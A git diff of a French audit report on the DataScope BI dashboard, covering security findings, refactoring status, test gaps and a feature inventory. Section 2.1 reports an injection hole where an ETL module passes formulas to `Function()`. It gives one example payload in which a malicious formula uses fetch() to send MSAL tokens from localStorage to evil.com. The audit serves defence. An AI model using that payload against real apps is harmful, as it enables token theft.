@@ -1,350 +1,642 @@
 # Rapport d'Audit - DataScope Dashboard
 
-**Application** : DataScope - Tableau de Bord d'Analyse de Données
-**Version auditée** : 2026-02-04-03
-**Date de l'audit** : 2026-02-06
-**Stack** : React 18 / TypeScript 5 / Vite 5 / IndexedDB / Cloudflare Pages
-**Volume de code** : ~35 700 lignes TypeScript, 12 pages, 36 composants, 11 contextes
+**Application** : DataScope - Plateforme BI & Analyse de Donnees locale
+**Date de l'audit** : 2026-02-07
+**Stack** : React 18 / TypeScript 5 / Vite 5 / Tailwind 3 / IndexedDB / Cloudflare Pages
+**Volume** : ~33 400 lignes TypeScript, 103 fichiers source, 12 pages, 11 contextes, 13 fichiers de tests
 
 ---
 
-## Table des matières
+## Table des matieres
 
-1. [Synthese executive](#1-synthese-executive)
-2. [Points forts](#2-points-forts)
-3. [Axes d'amelioration - Priorite critique](#3-priorite-critique)
-4. [Axes d'amelioration - Priorite haute](#4-priorite-haute)
-5. [Axes d'amelioration - Priorite moyenne](#5-priorite-moyenne)
-6. [Axes d'amelioration - Priorite basse](#6-priorite-basse)
-7. [Matrice recapitulative](#7-matrice-recapitulative)
-
----
-
-## 1. Synthese executive
-
-DataScope est une application SPA d'analyse de donnees locale, bien concue dans son architecture generale. L'approche "local-first" est coherente et bien implementee : les donnees restent dans le navigateur (IndexedDB), aucune telemetrie n'est envoyee, et l'integration O365 est optionnelle et explicitement declenchee par l'utilisateur.
-
-Les principales forces de l'application sont sa richesse fonctionnelle (pivot, budget, ETL, dashboard, forecasting), son typage TypeScript strict, et son design system bien structure avec support multi-themes.
-
-Les points d'attention principaux concernent la dependance a des CDN externes en runtime (Tailwind, esm.sh), l'absence de Content Security Policy, la taille excessive de certains fichiers (6 fichiers > 1000 lignes), et l'absence d'Error Boundaries React.
+- [Partie 1 - Audit technique](#partie-1---audit-technique)
+  - [1. Points forts](#1-points-forts)
+  - [2. Problemes restants](#2-problemes-restants)
+  - [3. Bilan des corrections](#3-bilan-des-corrections-effectuees)
+- [Partie 2 - Recommandations fonctionnelles BI](#partie-2---recommandations-fonctionnelles-bi)
+  - [4. Inventaire fonctionnel](#4-inventaire-des-fonctionnalites-existantes)
+  - [5. Fonctionnalites a apporter](#5-fonctionnalites-et-ameliorations-a-apporter)
+- [Partie 3 - Analyse UX / Design](#partie-3---analyse-ux--design)
+  - [6. Design system](#6-design-system)
+  - [7. Layout et navigation](#7-layout-et-navigation)
+  - [8. Analyse par page](#8-analyse-detaillee-par-page)
+  - [9. Patterns UX transversaux](#9-patterns-ux-transversaux)
+  - [10. Scoring et recommandations](#10-scoring-et-recommandations-ux)
 
 ---
 
-## 2. Points forts
+# Partie 1 - Audit technique
 
-### 2.1 Architecture local-first coherente (Fonctionnel)
+## 1. Points forts
 
-- Toutes les donnees sont traitees et stockees localement dans IndexedDB (`utils.ts:79-203`)
+### 1.1 Architecture local-first coherente (Fonctionnel)
+
+- Toutes les donnees sont traitees et stockees localement dans IndexedDB (`utils/db.ts`)
 - Aucune telemetrie, aucun tracking, aucun appel reseau non sollicite
 - Migration automatique de localStorage vers IndexedDB avec nettoyage (`DataContext.tsx:91-111`)
-- Compression intelligente des batches en format colonnaire pour economiser l'espace (`utils.ts:17-54`)
-- L'integration O365 (OneDrive) est strictement optionnelle, initiee par l'utilisateur, et authentifiee via OAuth 2.0 + PKCE
+- Compression intelligente des batches en format colonnaire pour economiser l'espace (`utils/common.ts`)
+- L'integration O365 (OneDrive) est strictement optionnelle, initiee par l'utilisateur, authentifiee via OAuth 2.0 + PKCE
 
-### 2.2 Moteur de formules securise (Technique / Securite)
+### 1.2 Moteur de formules securise (Technique / Securite)
 
-- Le parseur de formules (`utils.ts:1402-1764`) est un tokenizer/evaluateur custom
-- **Aucun usage de `eval()`, `Function()`, ou `new Function()`** dans tout le codebase
-- **Aucun usage de `dangerouslySetInnerHTML`**
-- Whitelist de fonctions supportees (IF, SUM, AVERAGE, CONCAT, etc.)
+- Le parseur de formules (`utils/formulaEngine.ts`, 352 lignes) est un tokenizer/evaluateur custom
+- Aucun usage de `eval()` ou `Function()` dans le moteur de formules (explicitement documente ligne 316)
+- Whitelist de 30+ fonctions supportees FR/EN (IF, SUM, AVERAGE, CONCAT, etc.)
+- Cache de tokens pour performances
 - Gestion d'erreurs gracieuse avec retour `null` en cas d'erreur de syntaxe
 
-### 2.3 Typage TypeScript robuste (Technique)
+### 1.3 Typage TypeScript robuste (Technique)
 
 - Mode `strict: true` active dans tsconfig
 - 8 fichiers de types bien organises par domaine (`types/common.ts`, `dataset.ts`, `dashboard.ts`, `pivot.ts`, `finance.ts`, `etl.ts`, `app.ts`, `o365.ts`)
 - Types unions discrimines pour les variants (`WidgetType`, `ChartType`, `ViewMode`)
-- Interfaces explicites pour les props des composants
-- Seulement 2 usages de `useState<any>` dans tout le projet (`DataContext.tsx:46`, `DataExplorer.tsx:55`)
+- Seulement 2 usages de `useState<any>` dans tout le projet
 
-### 2.4 Design system structure et themable (Technique / UX)
+### 1.4 Build et securite web (Technique / Securite)
 
-- Tokens CSS complets definis via variables CSS dans `index.html:86-268`
-- 9 palettes de couleurs (blue, indigo, emerald, rose, amber, slate, teal, violet, orange)
-- Support mode sombre (dark mode)
-- 3 styles visuels (defaut, material, glass avec backdrop-filter)
-- Taille de police configurable via `--app-font-size`
-- Composants UI reutilisables (`Button`, `Modal`, `Card`, `Tabs`, `Badge`, `Form`)
+- **Tailwind en build-time** via PostCSS (`tailwind.config.js` + `postcss.config.js` + `index.css`) - plus de CDN runtime
+- **CSP implementee** (`index.html:7`) avec restrictions sur `default-src`, `font-src`, `img-src`, `connect-src`
+- **Plus d'import maps ni de CDN** : toutes les dependances sont bundlees par Vite
+- **Plus de conflit de versions React** : seul React 18.2.0 est utilise
 
-### 2.5 Performances correctes (Technique)
+### 1.5 Architecture modulaire (Technique)
+
+- **`utils.ts` decompose** en 7 modules specialises (8 lignes de re-exports) :
+  - `utils/db.ts` (144 lignes) - IndexedDB engine
+  - `utils/formulaEngine.ts` (352 lignes) - Parseur de formules
+  - `utils/csvParser.ts` (166 lignes) - Parsing CSV/TSV
+  - `utils/exportUtils.ts` (497 lignes) - Export PDF/HTML/PNG avec imports dynamiques
+  - `utils/common.ts` (535 lignes) - Utilitaires partages
+  - `utils/mathUtils.ts` (21 lignes) - Regression lineaire
+  - `utils/dataGeneration.ts` (222 lignes) - Donnees de demo
+  - `utils/diagnostics.ts` (53 lignes) - Suite de diagnostics
+- **`PivotTable.tsx` decompose** : page reduite a 200 lignes, logique extraite dans `hooks/usePivotLogic.ts` (842 lignes) et `PivotOverlays.tsx` (46 lignes)
+
+### 1.6 Error Boundary et code splitting (Technique)
+
+- **Error Boundary** (`components/ErrorBoundary.tsx`, 89 lignes) : UI soignee avec affichage de l'erreur, boutons "Reessayer" et "Retour a l'accueil", message rassurant sur la preservation des donnees
+- **Code splitting** : 12 pages chargees via `React.lazy()` (`App.tsx:8-19`) avec `<Suspense fallback={<LoadingPage />}>`
+- **Imports dynamiques** : jsPDF et html2canvas charges a la demande (`exportUtils.ts:26-29`), pas dans le bundle principal
+
+### 1.7 Performances (Technique)
 
 - Virtualisation des tableaux pivot via `@tanstack/react-virtual` (`PivotGrid.tsx`)
-- Memoisation extensive : `useMemo` dans ChartModal (10+ usages), `React.memo` sur WidgetCard
-- `useCallback` dans 7 fichiers (64 occurrences totales)
-- Import dynamique pour les librairies lourdes : `import('jspdf')`, `import('../services/o365Service')`
+- Memoisation extensive : `useMemo`, `React.memo` sur WidgetCard, `useCallback` dans 7 fichiers (64 occurrences)
 - Debounce des calculs pivot (150ms) et sauvegarde IndexedDB differee
+- Identifiants generes via `crypto.randomUUID()` (`utils/common.ts:6-8`)
 
-### 2.6 Accessibilite de base implementee (UX)
+### 1.8 Design system themable (UX)
 
-- `aria-busy`, `aria-label` sur Button (`components/ui/Button.tsx`)
-- `role="dialog"`, `aria-modal="true"`, `aria-labelledby` sur Modal (`components/ui/Modal.tsx`)
-- `role="tablist"`, `aria-selected`, `aria-controls` sur Tabs (`components/ui/Tabs.tsx`)
-- Gestion du clavier (Escape pour fermer les modales)
-- `focus-visible:ring-2` pour la navigation clavier
+- Tokens CSS complets dans `index.css` via `@layer base` : 9 palettes, dark mode, 3 styles visuels (defaut, material, glass)
+- Configuration Tailwind externalisee dans `tailwind.config.js` (74 lignes) avec `darkMode: 'class'`
+- Composants UI reutilisables : Button (5 variants, 4 tailles), Modal (ARIA complet), Tabs (navigation clavier), Badge, MultiSelect
 
-### 2.7 Richesse fonctionnelle (Fonctionnel)
+### 1.9 Richesse fonctionnelle (Fonctionnel)
 
-- Import multi-format (CSV, Excel) avec detection automatique d'encodage et de separateur
+- Import multi-format (CSV, Excel, TSV, copier-coller) avec detection encodage et separateur
 - Tableaux croises dynamiques avec drill-down et comparaison temporelle
-- Dashboard personnalisable avec widgets configurables et drag-and-drop
+- Dashboard personnalisable avec widgets configurables (KPI, Chart, List, Text, Report)
 - Module budget avec versioning, workflow de validation et templates
-- Pipeline ETL avec blending/jointures et validation
-- Export multi-format (Excel, PDF, CSV, image)
-- Sauvegarde/restauration complete de l'etat applicatif
+- Module forecast avec 5 methodes de prevision et reconciliation
+- Pipeline ETL avec 18 transformations et editeur visuel
+- Export multi-format (Excel, PDF, HTML interactif, PNG, CSV)
+- 15 types de graphiques supportes
 
 ---
 
-## 3. Priorite critique
+## 2. Problemes restants
 
-### 3.1 [SECURITE] Dependances CDN en runtime sans protection
+### 2.1 [SECURITE - CRITIQUE] Injection de code via `new Function()` dans l'ETL
 
-**Fichier** : `index.html:16, 269-290`
+**Fichier** : `utils/transformations.ts:384`
 
-L'application charge Tailwind CSS et toutes ses dependances JavaScript depuis des CDN externes en runtime :
-
-```html
-<script src="https://cdn.tailwindcss.com"></script>
+```typescript
+const result = Function('"use strict"; return (' + expression + ')')();
 ```
 
-```json
-"react": "https://esm.sh/react@18.2.0",
-"recharts": "https://esm.sh/recharts@2.12.2",
-...
+Le module ETL utilise le constructeur `Function()` pour evaluer les formules de colonnes calculees. L'expression est construite en remplacant `[ColName]` par les valeurs des lignes (ligne 375-381), mais aucune sanitization n'est appliquee sur le reste de la formule.
+
+**Contraste** : Le moteur de formules principal (`formulaEngine.ts`) utilise un parseur securise sans `eval`/`Function`. Ce module ETL devrait utiliser le meme parseur.
+
+**Risque** : Un backup forge contenant une formule ETL malveillante (ex: `[ColA] + 1); fetch('https://evil.com', {method:'POST', body: localStorage.getItem('msal')}) //(`) pourrait executer du code arbitraire lors de l'execution du pipeline.
+
+**Recommandation** : Remplacer `Function()` par le `FormulaParser` de `formulaEngine.ts`, ou a defaut valider l'expression avec une whitelist de caracteres autorises (chiffres, operateurs, parentheses).
+
+### 2.2 [SECURITE - MOYENNE] CSP avec `unsafe-inline` dans `script-src`
+
+**Fichier** : `index.html:7`
+
+La CSP actuelle contient `script-src 'self' 'unsafe-inline'`. Le `unsafe-inline` est necessaire pour les scripts inline Vite en mode dev, mais il affaiblit significativement la protection contre les XSS. Combine avec la vulnerabilite `Function()` ci-dessus, un attaquant pourrait exploiter les deux.
+
+**Recommandation** : Pour la production, utiliser un nonce CSP genere par le serveur ou le plugin `vite-plugin-csp` pour eliminer `unsafe-inline`. Cloudflare Pages supporte les headers dynamiques via `_headers` avec nonce.
+
+### 2.3 [SECURITE - MOYENNE] Validation de companyLogo incomplete
+
+**Fichier** : `DataContext.tsx:837`
+
+```typescript
+if (shouldImport('companyLogo') && parsed.companyLogo) setCompanyLogo(parsed.companyLogo);
 ```
 
-**Risques** :
-- Si `cdn.tailwindcss.com` ou `esm.sh` sont compromis, du code malveillant peut etre injecte
-- Aucun hash SRI (Subresource Integrity) n'est present
-- L'application ne fonctionne pas hors-ligne sans ces CDN
-- La version CDN de Tailwind n'est pas recommandee pour la production (performances, cache)
+Lors de la restauration d'un backup, `companyLogo` est importe sans verification de protocole. Une validation existe en aval dans `exportUtils.ts:85` (`safeLogo` verifie `data:image/` ou `blob:`), mais pas a l'entree dans le state.
 
-**Conflit de versions React** : L'import map reference React 18.2.0 pour les imports principaux, mais les lignes 286-287 pointent vers React 19.2.3 pour les sous-chemins (`react/`, `react-dom/`). Cela peut provoquer des bugs subtils lies a deux instances React coexistant dans le bundle.
+**Recommandation** : Ajouter la validation de protocole dans `importBackup` avant `setCompanyLogo`, pour bloquer les URIs malveillantes a la source.
 
-**Recommandation** : Passer a un build Vite complet qui bundle toutes les dependances. Tailwind doit etre installe via PostCSS (`@tailwindcss/postcss` ou `tailwindcss` en devDependency). Les import maps doivent etre supprimes au profit du bundling Vite standard. Cela corrige simultanement la securite, les performances et le fonctionnement hors-ligne.
+### 2.4 [SECURITE - BASSE] Tokens MSAL en localStorage
 
-### 3.2 [SECURITE] Absence de Content Security Policy (CSP)
+**Fichier** : `services/o365Service.ts:46`
 
-Aucune en-tete CSP ni meta-tag CSP n'est presente. Combinee avec les CDN externes et les scripts inline dans `index.html`, l'application est vulnerable a l'injection de scripts.
-
-**Recommandation** : Ajouter une CSP stricte, soit via meta-tag dans `index.html`, soit via les headers Cloudflare (`_headers` file). Apres migration vers un build complet (point 3.1), la CSP peut etre tres restrictive :
-
-```
-Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://graph.microsoft.com https://login.microsoftonline.com
+```typescript
+cacheLocation: BrowserCacheLocation.LocalStorage,
 ```
 
----
+Le localStorage est accessible a tout script JavaScript executant dans la meme origine. Le risque est attenue par la CSP et l'absence de XSS identifie (hors le point 2.1).
 
-## 4. Priorite haute
+**Recommandation** : Migrer vers `BrowserCacheLocation.SessionStorage` pour limiter la persistance des tokens.
 
-### 4.1 [TECHNIQUE] Fichiers mono-blocs excessivement volumineux
+### 2.5 [TECHNIQUE - HAUTE] 6 fichiers > 1000 lignes non refactorises
 
-6 fichiers depassent 1000 lignes, certains largement :
+| Fichier | Lignes | useState |
+|---------|--------|---------|
+| `pages/Budget.tsx` | 2 296 | 31 |
+| `pages/AnalysisStudio.tsx` | 1 872 | 30 |
+| `components/pivot/ChartModal.tsx` | 1 593 | - |
+| `pages/DataExplorer.tsx` | 1 575 | 27 |
+| `pages/Settings.tsx` | 1 464 | 23 |
+| `pages/Forecast.tsx` | 1 125 | 11 |
 
-| Fichier | Lignes | Responsabilites melangees |
-|---------|--------|--------------------------|
-| `pages/Budget.tsx` | 2 296 | UI + logique metier + formulaires + import/export |
-| `utils.ts` | 2 037 | IndexedDB + formules + export PDF + parsing CSV + regression + diagnostics |
-| `pages/AnalysisStudio.tsx` | 1 872 | Analyses + graphiques + export |
-| `pages/DataExplorer.tsx` | 1 574 | Exploration + filtrage + blending |
-| `pages/Settings.tsx` | 1 464 | Preferences + O365 + backup + referentiels |
-| `pages/PivotTable.tsx` | 992 | Pivot + modales + configuration |
-
-**Impact** :
-- Difficulte de maintenance et de comprehension
-- `PivotTable.tsx` declare 30+ `useState` dans un seul composant
-- Violation du principe de responsabilite unique
-- Re-rendus potentiellement excessifs (tout le state dans un composant)
+Les 3 premieres pages cumulent **88 `useState`** dans des composants monolithiques. Cela provoque des re-rendus excessifs et rend la maintenance tres difficile.
 
 **Recommandation** :
-- Decomposer `utils.ts` en modules : `db.ts`, `formulaEngine.ts`, `csvParser.ts`, `exportUtils.ts`, `mathUtils.ts`
-- Extraire la logique metier des pages en hooks customs (`useBudgetEditor`, `usePivotConfig`, etc.)
-- Grouper les useState lies dans des `useReducer` (ex: les 30+ states de PivotTable)
-- Decomposer les grandes pages en sous-composants (ex: `BudgetEditor`, `BudgetComparison`, `BudgetWorkflow`)
+- Appliquer le meme pattern que PivotTable : extraire la logique dans des hooks custom (`useBudgetEditor`, `useAnalysisStudio`, etc.)
+- Grouper les states lies dans des `useReducer` thematiques
+- Decomposer les pages en sous-composants (ex: `BudgetEditor`, `BudgetComparison`, `BudgetWorkflow`)
 
-### 4.2 [TECHNIQUE] Absence d'Error Boundaries React
+### 2.6 [TECHNIQUE - HAUTE] 279 occurrences de `: any`
 
-Aucun Error Boundary n'est implemente (le terme n'apparait que dans `MAINTENANCE.md` comme suggestion). Si un composant plante (erreur JavaScript), l'application entiere affiche un ecran blanc sans possibilite de recuperation.
+Les fichiers les plus affectes :
+- `pages/AnalysisStudio.tsx` : 35 occurrences
+- `components/pivot/ChartModal.tsx` : 23
+- `components/pivot/PivotGrid.tsx` : 20
+- `pages/DataExplorer.tsx` : 9
 
-**Impact** : Une erreur dans le rendu d'un graphique D3, d'un calcul pivot, ou d'un widget fait perdre l'acces a toute l'application. L'utilisateur doit rafraichir la page et peut perdre un etat non sauvegarde.
+**Recommandation** : Activer `@typescript-eslint/no-explicit-any` et remplacer progressivement par des types explicites ou `unknown` avec type guards.
 
-**Recommandation** : Ajouter des Error Boundaries autour :
-- De chaque route/page (via un wrapper dans `App.tsx`)
-- Des composants de graphiques (`WidgetDisplay`, `SunburstD3`, `ChartModal`)
-- Du moteur pivot (`PivotGrid`)
+### 2.7 [TECHNIQUE - MOYENNE] Absence d'outillage qualite
 
-### 4.3 [TECHNIQUE] Absence de code splitting au niveau des routes
+- Pas de configuration ESLint, Prettier, ou StyleLint
+- Pas de pipeline CI/CD (`.github/workflows/` absent)
+- Deploiement uniquement manuel (`wrangler pages deploy dist`)
 
-Aucun `React.lazy()` ni `Suspense` n'est utilise. Les 12 pages et leurs 36 composants sont charges dans un seul bundle. Pour une application de cette taille (~35K lignes), cela impacte le temps de chargement initial.
+**Recommandation** : Ajouter ESLint + Prettier + un workflow GitHub Actions minimal (`tsc --noEmit` + `vitest run` + `eslint .` + build).
 
-**Recommandation** : Utiliser `React.lazy()` pour chaque route dans `App.tsx` :
+### 2.8 [TECHNIQUE - MOYENNE] Couverture de tests limitee
 
-```tsx
-const Budget = React.lazy(() => import('./pages/Budget'));
-const PivotTable = React.lazy(() => import('./pages/PivotTable'));
-// etc.
-```
-
-Le code splitting de Vite (`vite.config.ts`) ne decoupe actuellement que les vendors (react, recharts, xlsx), pas les pages applicatives.
-
-### 4.4 [SECURITE] Validation insuffisante des URLs d'images
-
-Le champ `companyLogo` (`DataContext.tsx:40`) est un string stocke en IndexedDB sans validation. Il est utilise dans des templates HTML d'export (`<img src="${companyLogo}">`) sans verification du protocole.
-
-**Risque** : Un logo malicieux (protocol `javascript:`, `data:text/html`, etc.) injecte via restauration de backup pourrait executer du code dans le contexte d'export.
-
-**Recommandation** : Valider que `companyLogo` commence par `data:image/` ou `blob:` et rejeter tout autre protocole.
-
----
-
-## 5. Priorite moyenne
-
-### 5.1 [TECHNIQUE] Absence d'outillage qualite (ESLint, Prettier)
-
-Aucune configuration ESLint, Prettier, ou StyleLint n'est presente. La coherence du code repose entierement sur la discipline des developpeurs.
-
-**Impact** : Inconsistances de style, imports inutilises non detectes, patterns dangereux non detectes automatiquement (ex: usage de `any`).
-
-**Recommandation** : Ajouter ESLint avec `@typescript-eslint` + `eslint-plugin-react-hooks` + `eslint-plugin-react-refresh`, et Prettier pour le formatage. Ajouter un script `lint` dans `package.json`.
-
-### 5.2 [TECHNIQUE] 92 occurrences de `: any` dans le code
-
-Le typage `any` est utilise dans 20 fichiers (92 occurrences). La majorite se concentre dans :
-- `utils.ts` : 27 occurrences
-- `hooks/useWidgetData.ts` : 14 occurrences
-- `context/DataContext.tsx` : 9 occurrences
-- `pages/DataExplorer.tsx` : 9 occurrences
-
-**Impact** : Perte de la securite de typage, bugs potentiels non detectes a la compilation.
-
-**Recommandation** : Remplacer progressivement les `any` par des types explicites ou `unknown` avec type guards. Activer la regle ESLint `@typescript-eslint/no-explicit-any` en warning puis en error.
-
-### 5.3 [TECHNIQUE] Couverture de tests limitee
-
-13 fichiers de tests existent, couvrant principalement la logique metier :
-- Moteur pivot (`pivotEngine.test.ts`)
-- Transformations ETL (`transformations.test.ts`)
-- Formules calculees (`calculatedFieldActions.test.ts`)
-- Utilitaires (`utils.test.ts`)
-
-**Manques identifies** :
+13 fichiers de tests couvrant la logique metier (pivot, transformations, formules, utils). Manques :
 - Aucun test d'integration des pages (Budget, PivotTable, Dashboard)
-- Un seul test de composant UI (`Button.test.tsx`)
+- 1 seul test composant UI (`Button.test.tsx`)
 - Aucun test des 11 contextes/providers
 - Aucun test du service O365
-- Aucun test end-to-end (Playwright, Cypress)
+- Aucun test E2E
 
-**Recommandation** : Prioriser les tests d'integration des workflows critiques (import de donnees, creation de pivot, export), et les tests des contextes (logique de persistence IndexedDB, migration localStorage).
+**Recommandation** : Prioriser les tests d'integration des workflows critiques (import, pivot, export) et des contextes.
 
-### 5.4 [TECHNIQUE] Absence de CI/CD
+### 2.9 [FONCTIONNEL - BASSE] Internationalisation en dur
 
-Aucun pipeline CI/CD n'est configure (pas de `.github/workflows/`, pas de Cloudflare Pages CI). Le deploiement est uniquement manuel via `wrangler pages deploy dist`.
+Toutes les chaines sont en francais codees en dur. Non bloquant si le public est francophone, mais limitant pour une ouverture future.
 
-**Impact** : Pas de verification automatique (types, tests, lint) avant deploiement. Risque de regression en production.
+### 2.10 [UX - BASSE] Accessibilite incomplete
 
-**Recommandation** : Ajouter un workflow GitHub Actions minimal :
-- `tsc --noEmit` (verification des types)
-- `vitest run` (tests)
-- `eslint .` (qualite de code)
-- Build + deploiement automatique sur push sur la branche de production
-
-### 5.5 [FONCTIONNEL] Internationalisation en dur
-
-L'application est entierement en francais avec des chaines codees en dur dans les composants :
-
-```tsx
-// Settings.tsx
-"Effacer la recherche"
-"Sauvegarde le :"
-"Vos informations sont stockees dans la memoire locale"
-```
-
-**Impact** : Impossible d'ajouter d'autres langues sans recrire les composants. Non bloquant si le public cible est exclusivement francophone, mais limitant pour une eventuelle ouverture.
-
-**Recommandation** : Si le multilinguisme est envisage a terme, introduire `react-i18next` et extraire les chaines dans des fichiers JSON. Sinon, ce point peut rester en basse priorite.
-
-### 5.6 [SECURITE] Tokens MSAL stockes dans localStorage
-
-La configuration MSAL (`services/o365Service.ts:46`) utilise `cacheLocation: BrowserCacheLocation.LocalStorage`. Le localStorage est accessible a tout script JavaScript executant dans l'origine.
-
-**Impact** : En l'absence de CSP (cf. 3.2), un script injecte pourrait voler les tokens OAuth. Le risque est attenue par le fait qu'il n'y a pas de XSS identifie et pas de contenu tiers injecte.
-
-**Recommandation** : Apres mise en place de la CSP, migrer vers `BrowserCacheLocation.SessionStorage` pour limiter la persistance des tokens. Ou mieux, utiliser `BrowserCacheLocation.MemoryStorage` si la persistance de session n'est pas critique.
-
----
-
-## 6. Priorite basse
-
-### 6.1 [UX] Pas de support hors-ligne (Service Worker)
-
-L'application n'a pas de Service Worker. Les donnees sont locales mais l'application elle-meme necessite un acces reseau pour charger les assets (surtout en configuration CDN actuelle).
-
-**Recommandation** : Apres migration vers un build complet (point 3.1), ajouter un Service Worker avec strategie cache-first via `vite-plugin-pwa`.
-
-### 6.2 [TECHNIQUE] Generation d'identifiants avec Math.random()
-
-```typescript
-// utils.ts:10-12
-export const generateId = (): string => {
-  return Math.random().toString(36).substr(2, 9);
-};
-```
-
-`Math.random()` n'est pas cryptographiquement securise. Pour une application locale sans composant collaboratif, le risque de collision est faible mais non nul pour de grands volumes.
-
-**Recommandation** : Remplacer par `crypto.randomUUID()` (supporte nativement dans les navigateurs modernes) pour garantir l'unicite.
-
-### 6.3 [UX] Accessibilite incomplete
-
-L'a11y est bien implementee sur les composants UI de base, mais des lacunes existent :
+- Pas de `aria-live` pour les notifications
 - Pas de `skip-to-content` link
-- Contrastes non verifies systematiquement (certains `txt-muted` sur fond clair)
-- Pas de `aria-live` pour les notifications/toasts
-- Le drag-and-drop des widgets n'a pas d'alternative clavier
+- Pas de `prefers-reduced-motion` (animations non desactivables)
+- Drag-and-drop inaccessible au clavier
 
-**Recommandation** : Realiser un audit WCAG 2.1 AA sur les parcours critiques.
+### 2.11 [UX - BASSE] Pas de Service Worker / PWA
 
-### 6.4 [TECHNIQUE] Imports statiques de librairies lourdes
-
-`utils.ts:3-5` importe `jsPDF` et `html2canvas` au top-level, ce qui les inclut dans le bundle principal meme si l'export PDF n'est pas utilise :
-
-```typescript
-import { jsPDF } from 'jspdf';
-import html2canvas from 'html2canvas';
-```
-
-Certains composants font deja du lazy import (`ChartModal.tsx` : `await import('jspdf')`), mais le top-level import dans `utils.ts` annule ce benefice.
-
-**Recommandation** : Supprimer les imports statiques de `jspdf` et `html2canvas` dans `utils.ts` et utiliser exclusivement des imports dynamiques.
-
-### 6.5 [TECHNIQUE] Design system Tailwind inline dans index.html
-
-La configuration Tailwind (tokens, theme) est definie en inline dans `index.html` (~250 lignes de CSS + JS). C'est fonctionnel mais peu maintenable.
-
-**Recommandation** : Lors de la migration vers Tailwind en build-time (point 3.1), extraire la configuration dans `tailwind.config.ts` et les styles dans un fichier CSS dedie.
+L'application necessite un acces reseau pour charger les assets (mais plus pour les CDN). Un Service Worker permettrait un fonctionnement hors-ligne complet.
 
 ---
 
-## 7. Matrice recapitulative
+## 3. Bilan des corrections effectuees
 
-| # | Axe | Categorie | Priorite | Effort estime |
-|---|-----|-----------|----------|---------------|
-| 3.1 | CDN runtime sans SRI + conflit React 18/19 | Securite / Technique | Critique | Important |
-| 3.2 | Absence de CSP | Securite | Critique | Faible |
-| 4.1 | Fichiers > 1000 lignes (6 fichiers) | Technique | Haute | Important |
-| 4.2 | Absence d'Error Boundaries | Technique | Haute | Faible |
-| 4.3 | Pas de code splitting des routes | Technique | Haute | Faible |
-| 4.4 | Validation URLs d'images manquante | Securite | Haute | Faible |
-| 5.1 | Pas d'ESLint / Prettier | Technique | Moyenne | Moyen |
-| 5.2 | 92 usages de `any` | Technique | Moyenne | Moyen |
-| 5.3 | Couverture de tests limitee | Technique | Moyenne | Important |
-| 5.4 | Absence de CI/CD | Technique | Moyenne | Moyen |
-| 5.5 | i18n en dur (francais seulement) | Fonctionnel | Moyenne | Important |
-| 5.6 | Tokens MSAL en localStorage | Securite | Moyenne | Faible |
-| 6.1 | Pas de Service Worker | UX | Basse | Moyen |
-| 6.2 | generateId avec Math.random() | Technique | Basse | Faible |
-| 6.3 | Accessibilite incomplete | UX | Basse | Moyen |
-| 6.4 | Imports statiques jsPDF/html2canvas | Technique | Basse | Faible |
-| 6.5 | Config Tailwind inline dans HTML | Technique | Basse | Moyen |
+Un recapitulatif de tous les points identifies initialement et de leur statut actuel :
+
+| # | Point initial | Priorite | Statut | Preuve |
+|---|---------------|----------|--------|--------|
+| 3.1 | CDN runtime + conflit React 18/19 | Critique | TRAITE | `index.html` : plus de CDN, `tailwind.config.js` + `postcss.config.js` + `index.css` |
+| 3.2 | Absence de CSP | Critique | TRAITE | `index.html:7` : meta CSP presente (reste `unsafe-inline`, cf. 2.2) |
+| 4.1 | Fichiers > 1000 lignes | Haute | PARTIEL | `utils.ts` decompose (2037 → 8 lignes), `PivotTable.tsx` decompose (992 → 200 lignes). 6 fichiers > 1000 lignes restants |
+| 4.2 | Pas d'Error Boundaries | Haute | TRAITE | `ErrorBoundary.tsx` (89 lignes), wrappee dans `App.tsx:33` |
+| 4.3 | Pas de code splitting | Haute | TRAITE | 12 `React.lazy()` dans `App.tsx:8-19` + `<Suspense>` |
+| 4.4 | Validation companyLogo | Haute | PARTIEL | Validation en sortie (`exportUtils.ts:85`), mais pas a l'entree (`DataContext.tsx:837`) |
+| 5.1 | ESLint / Prettier | Moyenne | NON TRAITE | Aucun fichier de config |
+| 5.2 | 279 usages de `any` | Moyenne | NON TRAITE | 279 occurrences dans 20+ fichiers |
+| 5.3 | Tests limites | Moyenne | NON TRAITE | 13 fichiers de tests, lacunes majeures |
+| 5.4 | CI/CD | Moyenne | NON TRAITE | Pas de `.github/workflows/` |
+| 5.5 | i18n en dur | Moyenne | NON TRAITE | Aucun framework i18n |
+| 5.6 | Tokens MSAL localStorage | Moyenne | NON TRAITE | `o365Service.ts:46` |
+| 6.1 | Service Worker / PWA | Basse | NON TRAITE | Aucune configuration PWA |
+| 6.2 | `generateId` Math.random() | Basse | TRAITE | `utils/common.ts:6-8` : `crypto.randomUUID()` |
+| 6.3 | Accessibilite | Basse | NON TRAITE | Pas d'`aria-live`, `skip-link` |
+| 6.4 | Imports statiques jsPDF | Basse | TRAITE | `exportUtils.ts:26-29` : imports dynamiques |
+| 6.5 | Config Tailwind inline | Basse | TRAITE | `tailwind.config.js` (74 lignes) + `index.css` (184 lignes) |
+
+**Score : 7 traites, 2 partiels, 8 non traites, 1 nouveau critique** (`Function()` dans ETL)
 
 ---
 
-**Legende effort** : Faible = quelques heures | Moyen = quelques jours | Important = une semaine ou plus
+# Partie 2 - Recommandations fonctionnelles BI
+
+## 4. Inventaire des fonctionnalites existantes
+
+| Module | Maturite | Points cles |
+|--------|----------|-------------|
+| Pivot Table | Avancee | Multi-sources, drill-down, 6 agregations, comparaison temporelle, conditional formatting, 15 types graphiques |
+| Dashboard | Avancee | 5 types widgets (KPI 3 styles, Chart 15 types, List, Text, Report), filtres globaux, export multi-format |
+| ETL Pipeline | Avancee | 18 transformations, editeur visuel nodes+connexions, preview live |
+| Budget | Tres avancee | Versions, workflow (draft/submitted/validated/rejected/locked), templates, 5 types formules, import/export |
+| Forecast | Tres avancee | 5 methodes (manual, copy, driver, ML, trend, seasonal), rolling, reconciliation, MAPE/RMSE |
+| Import | Avancee | Excel/CSV/TSV/copier-coller, auto-detection encodage/separateur, mapping intelligent |
+| Export | Avancee | PDF, HTML interactif, PNG, CSV/Excel |
+| Formules | Avancee | 30+ fonctions FR/EN, parseur securise, cache, 14 actions sequentielles |
+| Analysis Studio | Intermediaire | Snapshot/Trend, regression lineaire, sauvegarde/chargement |
